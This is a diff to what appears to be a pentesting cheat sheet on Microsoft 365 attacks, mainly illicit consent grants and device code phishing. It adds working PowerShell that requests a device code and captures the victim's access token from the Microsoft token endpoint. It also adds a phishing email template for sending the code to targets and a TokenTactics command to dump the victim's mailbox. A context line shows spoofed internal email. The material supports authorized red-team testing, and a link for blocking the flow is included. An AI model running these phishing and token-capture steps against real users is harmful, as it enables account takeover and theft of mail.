@@ -252,6 +252,7 @@ reg.Header.Set(string(b), nothing_to_see_here)
 
 ## Illicit Consent Grant
 - Verified publisher: https://techcommunity.microsoft.com/t5/microsoft-entra-azure-ad-blog/publisher-verification-and-app-consent-policies-are-now/ba-p/1257374
+- User Consent setting - "Allow user consent for apps from verified publishers, for selected permissions" (Note that this doesn't stop consent for applications from the same tenant as thetarget)
 
 #### Check if users are allowed to consent to apps
 - Requires a valid account in the target tenant
@@ -331,44 +332,49 @@ python 365-Stealer.py --refresh-all
 Send-MailMessage -SmtpServer CompanyDomain-com.mail.protection.outlook.com -Subject “Subject Here” -To ‘Full Name <user2@companyDomain.com>‘ -From ‘From Full Name <user1@companyDomain.com>‘ -Body “Hello From your Co-worker” -BodyAsHtml
 ```
 
-### Device code auth
-- https://aadinternals.com/post/phishing/
-- https://www.offsec-journey.com/post/phishing-with-azure-device-codes
-- https://www.youtube.com/watch?v=GZ_nn0uRLr4
-
-### Example TokenTactics
-- https://github.com/rvrsh3ll/TokenTactics
+### Device code phishing
+- Login to devices that has limited input posibility, Like a smart TV.
+- Flow
+  - Enter code on device on https://microsoft.com/devicelogin
+  - Perform normal authentication, including MFA as user
+  - On successful login the device gets access and refresh tokens
+- Links
+  - https://aadinternals.com/post/phishing/
+  - https://www.offsec-journey.com/post/phishing-with-azure-device-codes
+  - https://www.youtube.com/watch?v=GZ_nn0uRLr4
+- Block device auth flow: https://learn.microsoft.com/en-us/entra/identity/conditional-access/how-to-policy-authentication-flows
 
 #### Request Device Code token
-- Copy the Device code
+- Code is only valid for 15 mi
+- Request it manually
+  - Uses version 2 of the device code auth flow
+  - Scope = all default permissions and offline access
+  - Copy the `user_code`
+```
+$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+$Scope = ".default offline_access"
+$GrantType = "urn:ietf:params:oauth:grant-type:device_code"
 
+$body = @{
+	"client_id" = $ClientID
+	"scope" = $Scope
+}
+
+$authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri
+"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode" -Body $body
+
+Write-Output $authResponse
+```
+
+- https://github.com/rvrsh3ll/TokenTactics
 ```
 ipmo .\TokenTactics-main\TokenTactics.psd1
 
 Get-AzureToken -Client MSGraph
 ```
 
-#### Send device code to the target
-- Email example:
-```
-Dear <USER>,
-
-Use the Code to access the content of the website: https://microsoft.com/devicelogin
-
-Code: <CODE>
-```
-
-#### Capture Access Token
-- Once the user registers the device, TokenTactics will capture the token. This is saved in `$response.access_token`
-
-#### Post exploitation
-- Example dump mailbox with TokenTactics:
-```
-Dump-OWAMailboxViaMSGraphApi -AccessToken $response.access_token -mailFolder  
-AllItems
-```
-
 #### Common application ID's
+- https://learn.microsoft.com/en-us/troubleshoot/azure/active-directory/verify-first-party-apps-sign-in
 ```
 ACOM Azure Website 	23523755-3a2b-41ca-9315-f81f3f566a95
 AEM-DualAuth 	69893ee3-dd10-4b1c-832d-4870354be3d8
@@ -382,6 +388,46 @@ Bing 	9ea1ad79-fdb6-4f9a-8bc3-2b70f96e34c7
 CPIM Service 	bb2a2e3a-c5e7-4f0a-88e0-8e01fd3fc1f4
 CRM Power BI Integration 	e64aa8bc-8eb4-40e2-898b-cf261a25954f
 ```
+
+#### Send device code to the target
+- Email example:
+```
+Dear <USER>,
+
+Use the Code to access the content of the website: https://microsoft.com/devicelogin
+
+Code: <CODE>
+```
+
+#### Capture Access Token
+- Manually saves in `$GraphAccessToken`
+```
+$body=@{
+	"client_id" = $ClientID
+	"grant_type" = $GrantType
+	"code" = $authResponse.device_code
+}
+$Tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri
+"https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body -ErrorAction SilentlyContinue
+$GraphAccessToken = $Tokens.access_token
+
+$GraphAccessToken 
+```
+
+- TokenTactics will capture the token. This is saved in `$response.access_token` variable.
+```
+$response.access_token
+```
+
+#### Post exploitation
+- Example dump mailbox with TokenTactics:
+```
+Dump-OWAMailboxViaMSGraphApi -AccessToken $response.access_token -mailFolder  
+AllItems
+```
+
+#### Dynamic Device Code Phishing
+- https://www.blackhillsinfosec.com/dynamic-device-code-phishing/
 
 ### Google workspace calendar event injection
 - Silently injects events to target calendars
